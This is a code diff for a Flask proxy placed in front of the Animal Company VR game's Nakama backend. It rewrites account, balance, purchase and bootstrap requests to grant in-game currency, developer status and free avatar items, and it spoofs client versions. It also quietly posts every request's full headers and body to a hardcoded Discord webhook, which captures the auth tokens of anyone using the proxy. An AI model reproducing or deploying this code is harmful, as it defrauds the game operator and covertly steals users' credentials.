@@ -1,147 +1,138 @@
-# api/main.py
-from fastapi import FastAPI, Request, Response, WebSocket
-from fastapi.responses import JSONResponse
-from fastapi.middleware.cors import CORSMiddleware
-import requests, json, os, re, urllib.parse
-from websockets.client import connect as ws_connect
+import json
+import os
+import requests
+from flask import Flask, request, Response, jsonify
 
-app = FastAPI()
+# hi skire thanks for the path shit
+app = Flask(__name__)
+session = requests.Session()
 
-TARGET_BASE = 'https://animalcompany.us-east1.nakamacloud.io'
-WEBHOOK_URL = 'webhookgohere'
-LOG_DIR = "request_logs"
-os.makedirs(LOG_DIR, exist_ok=True)
+animalcompAPI = 'https://animalcompany.us-east1.nakamacloud.io'
+Version = "1.26.1.1394"  # zombies: "1.26.1.1394" | lava update: "1.17.3.1153"
+IdkWhatTheFuckTsis = "MetaQuest_1.17.3.1153_96d6b8b7"  # zombies: "MetaQuest_1.26.1.1394_0698af8b"
+ProdZipFile = "https://github.com/FreakyUnity/moddedanimalcompany/raw/refs/heads/main/game-data-prod.zip"
+GameDataProd = "https://github.com/FreakyUnity/moddedanimalcompany/tree/main/game-data-prod"
+PhotonAppId = "88b85ae7-68c2-408b-8afd-99401475ef7c"
+PhotonVoiceAppId = "71e8ae24-3b8a-425f-918a-0534450545e6"
+HardCurrency = 50000
+SoftCurrency = 9000000
+ResearchPoints = 50000
+Webhook = "https://discord.com/api/webhooks/1396924742409392128/LkoywoXgtMkdwhIO8ICHPelB2ToEevofduoitdLufd4n4gtvm04v-SHselerKjHO7GQa"
 
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
-
-def spoof_headers(headers: dict):
-    spoofed = {
-        k: v for k, v in headers.items()
-        if not k.lower().startswith("x-replit-") and k.lower() not in ['host', 'content-length', 'transfer-encoding']
-    }
-    spoofed.update({
-        "X-Unity-Version": "1.29.1.1463",
-        "User-Agent": "1.29.1.1463",
-        "App-Version": "1.29.1.1463",
-        "Oculus-SDK-Version": "1463",
-        "Device-Model": "Quest2",
-        "Platform": "Android",
-        "Device-ID": "00:00:00:00:00:00",
-        "X-Platform-Version": "1.29.1.1463"
-    })
-    return spoofed
-
-def spoof_body(body: str):
-    body = re.sub(r'(\"?client[_-]?version\"?\s*[:=]\s*[\"\']?)[^"\']+', r'\g<1>1.29.1.1463', body)
-    body = re.sub(r'(\"?version[_-]?code\"?\s*[:=]\s*)\d+', r'\g<1>1463', body)
-    body = re.sub(r'(\"?oculus[_-]?sdk[_-]?version\"?\s*[:=]\s*)[\"\']?[^"\']+', r'\g<1>1463', body)
-    body = re.sub(r'(\"?platform\"?\s*[:=]\s*)[\"\']?[^"\']+', r'\g<1>Android', body)
-    body = re.sub(r'(\"?device[_-]?model\"?\s*[:=]\s*)[\"\']?[^"\']+', r'\g<1>Quest2', body)
-    body = re.sub(r'(\"?buildNumber\"?\s*[:=]\s*)\d+', r'\g<1>1463', body)
-    body = re.sub(r'(\"?metaQuestStoreVersion\"?\s*[:=]\s*)\d+', r'\g<1>1463', body)
-    body = re.sub(r'(\"?min_supported_version\"?\s*[:=]\s*)[\"\']?[^"\']+', r'\g<1>1.0.0', body)
-    return body
-
-async def forward_request(path: str, request: Request):
-    method = request.method
-    target_url = f"{TARGET_BASE}/{path.lstrip('/')}"
-    headers = spoof_headers(dict(request.headers))
-    raw_data = await request.body()
-    body_str = spoof_body(raw_data.decode('utf-8', errors='ignore'))
-
-    if path.endswith("clientBootstrap"):
-        try:
-            json_request = json.loads(body_str)
-            if isinstance(json_request, dict):
-                json_request["clientVersion"] = "1.29.1.1463"
-                json_request["oculus_sdk_version"] = "1463"
-                json_request["deviceModel"] = "Quest2"
-                json_request["platform"] = "Android"
-                json_request["buildNumber"] = "1463"
-                json_request["metaQuestStoreVersion"] = "1463"
-                json_request["min_supported_version"] = "1.0.0"
-                body_str = json.dumps(json_request)
-        except:
-            pass
-
+def discrddddd(path, method, headers, params, body):
     try:
-        forwarded_response = requests.request(
-            method=method,
-            url=target_url,
-            headers=headers,
-            data=body_str.encode(),
-            allow_redirects=False
-        )
-
-        content_type = forwarded_response.headers.get("Content-Type", "")
-        modified_content = forwarded_response.content
-
-        if 'application/json' in content_type:
-            try:
-                json_response = forwarded_response.json()
-
-                if 'wallet' in json_response:
-                    wallet = json.loads(json_response['wallet']) if isinstance(json_response['wallet'], str) else json_response['wallet']
-                    wallet = {"hardCurrency": 2000000, "companyCoins": 2000000}
-                    json_response['wallet'] = json.dumps(wallet)
-
-                if 'user' in json_response and 'username' in json_response['user']:
-                    json_response['user']['username'] = "ModHub User"
-
-                json_response = {k: v for k, v in json_response.items() if k not in ['forceUpdate', 'unsupportedVersion']}
-                json_response.update({
-                    "forceUpdate": False,
-                    "min_supported_version": "1.0.0",
-                    "recommended_version": "1.29.1.1463",
-                })
-
-                modified_content = json.dumps(json_response).encode()
-            except:
-                pass
-
-        filtered_headers = {
-            k: v for k, v in forwarded_response.headers.items()
-            if k.lower() not in ['content-encoding', 'transfer-encoding', 'connection']
+        embed = {
+            "title": "TEST",
+            "fields": [
+                {"name": "Path", "value": f"`{path}`", "inline": False},
+                {"name": "Method", "value": f"`{method}`", "inline": True},
+                {"name": "Headers", "value": f"```json\n{json.dumps(headers, indent=2)}```", "inline": False},
+                {"name": "Params", "value": f"```json\n{json.dumps(params, indent=2)}```", "inline": False},
+                {"name": "Body", "value": f"```json\n{body}```", "inline": False},
+            ],
+            "color": 0x000000
         }
+        requests.post(Webhook, json={"embeds": [embed]}, timeout=2)
+    except:
+        pass
 
-        return Response(
-            content=modified_content,
-            status_code=forwarded_response.status_code,
-            headers=filtered_headers,
-            media_type=content_type
+
+@app.route('/', defaults={'path': ''}, methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"])
+@app.route('/<path:path>', methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"])
+def catch_all(path):
+    try:
+        method = request.method
+        headers = dict(request.headers)
+        params = request.args
+        data = request.get_data()
+
+        AnimalCompanyAPI = f"{animalcompAPI}/{path}"
+
+        discrddddd(
+            path=path,
+            method=method,
+            headers=headers,
+            params=params.to_dict(),
+            body=data.decode("utf-8", errors="ignore")
         )
 
+        if path == "v2/account/authenticate/custom":
+            b = json.loads(data)
+            if isinstance(b, dict) and 'vars' in b:
+                b['vars']['clientUserAgent'] = IdkWhatTheFuckTsis
+            resp = session.request(method, AnimalCompanyAPI, headers=headers, data=json.dumps(b), params=params)
+
+        elif path == "v2/account":
+            b = json.loads(data)
+            if isinstance(b, dict):
+                b['clientUserAgent'] = IdkWhatTheFuckTsis
+                b['vars'] = Version
+                b['SoftCurrency'] = SoftCurrency
+                b['HardCurrency'] = HardCurrency
+                b['researchPoints'] = ResearchPoints
+
+                if 'Username' in b and isinstance(b['Username'], dict) and 'DisplayName' in b['Username']:
+                    if b['Username']['DisplayName'] in ["iruss882", "iKDO.19"]:
+                        b['isDeveloper'] = True
+                        b['Username']['DisplayName'] = "<color=black>ur mom</color>"
+                    else:
+                        b['Username']['DisplayName'] = "MoonCompany" + b['Username']['DisplayName']
+
+            resp = session.request(method, AnimalCompanyAPI, headers=headers, data=json.dumps(b), params=params)
+
+        elif path in ["version", "v2/version"]:
+            b = json.loads(data)
+            if isinstance(b, dict):
+                b.update({
+                    'version': Version,
+                    'clientVersion': Version,
+                    'gameVersion': Version,
+                    'forceUpdate': False,
+                    'clientUserAgent': IdkWhatTheFuckTsis
+                })
+            resp = session.request(method, AnimalCompanyAPI, headers=headers, data=json.dumps(b), params=params)
+
+        elif path == "v2/rpc/mining.balance":
+            b = json.loads(data)
+            if isinstance(b, dict):
+                b['HardCurrency'] = HardCurrency
+                b['researchPoints'] = ResearchPoints
+            resp = session.request(method, AnimalCompanyAPI, headers=headers, data=json.dumps(b), params=params)
+
+        elif path == "v2/rpc/purchase.avatarItems":
+            b = json.loads(data)
+            if isinstance(b, dict):
+                b['true'] = True
+                b['none'] = False
+            resp = session.request(method, AnimalCompanyAPI, headers=headers, data=json.dumps(b), params=params)
+
+        elif path == "v2/rpc/clientBootstrap":
+            b = json.loads(data)
+            if isinstance(b, dict):
+                b.update({
+                    'version': Version,
+                    'clientVersion': Version,
+                    'gameVersion': Version,
+                    'minVersion': Version,
+                    'requiredVersion': Version,
+                    'gameDataURL': ProdZipFile,
+                    'PhotonAppId': PhotonAppId,
+                    'PhotonVoiceAppId': PhotonVoiceAppId
+                })
+            resp = session.request(method, AnimalCompanyAPI, headers=headers, data=json.dumps(b), params=params)
+
+        else:
+            resp = session.request(method, AnimalCompanyAPI, headers=headers, data=data, params=params)
+
+        if 'application/json' in resp.headers.get('Content-Type', ''):
+            return jsonify(resp.json()), resp.status_code
+
+        return Response(resp.content, status=resp.status_code, headers=dict(resp.headers))
+
     except Exception as e:
-        return JSONResponse(content={"error": "Proxy Error", "details": str(e)}, status_code=502)
+        return f"Internal Server Error: {str(e)}", 500
 
-@app.middleware("http")
-async def log_request_route(request: Request, call_next):
-    print(f"[ROUTE] {request.method} {request.url.path}")
-    return await call_next(request)
 
-@app.websocket("/ws")
-async def websocket_endpoint(websocket: WebSocket):
-    await websocket.accept()
-    token = websocket.query_params.get("token")
-    if not token:
-        await websocket.close(code=1008)
-        return
-    try:
-        token = urllib.parse.quote(token)
-        url = f"wss://animalcompany.us-east1.nakamacloud.io/ws?lang=en&status=True&token={token}"
-        async with ws_connect(url) as ws:
-            result = await ws.recv()
-            await websocket.send_text(result)
-    except Exception as e:
-        await websocket.send_text(f"Error: {e}")
-        await websocket.close()
-
-@app.api_route('/v2/{path:path}', methods=["GET", "POST", "PUT", "PATCH", "DELETE"])
-async def handle_all_v2(path: str, request: Request):
-    return await forward_request(f"v2/{path}", request)
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 7000))
+    app.run(host="0.0.0.0", port=port)
